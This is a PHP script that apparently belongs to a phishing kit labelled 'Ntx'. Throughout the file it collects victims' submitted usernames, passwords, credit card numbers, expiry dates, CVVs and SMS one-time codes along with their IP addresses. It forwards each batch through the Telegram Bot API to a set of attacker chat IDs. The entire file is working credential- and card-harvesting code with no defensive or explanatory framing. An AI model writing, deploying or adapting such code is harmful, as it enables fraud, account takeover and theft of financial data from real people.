<?php 
@session_start();
require '../config.php';

$ip = $_SERVER['REMOTE_ADDR'];

function hit($link){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $link);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$res = curl_exec($c);
	curl_close($c);
	return $res;
}


if(isset($_POST['user'])){
	
$text = urlencode("
-> Ntx Log - $ip
User : ".$_POST['user']."
Pass : ".$_POST['pass']."
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
	echo $link;
}

	
}



if(isset($_POST['cc'])){
	$_SESSION['cc'] = str_replace(" ", "", $_POST['cc']);

$text = urlencode("
-> Ntx CC - $ip
Name : ".$_POST['fname']." ".$_POST['lname']."
Cc : ".str_replace(" ", "", $_POST['cc'])."
Exp : ".$_POST['exp']." 
Cvv : ".$_POST['cvv']." 
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
}

	
}




if(isset($_POST['sms'])){
	
$text = urlencode("
-> Ntx OTP - $ip
Otp : ".$_POST['sms']."
Cc : ".$_SESSION['cc']."
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
}

sleep(5);
	
}



?>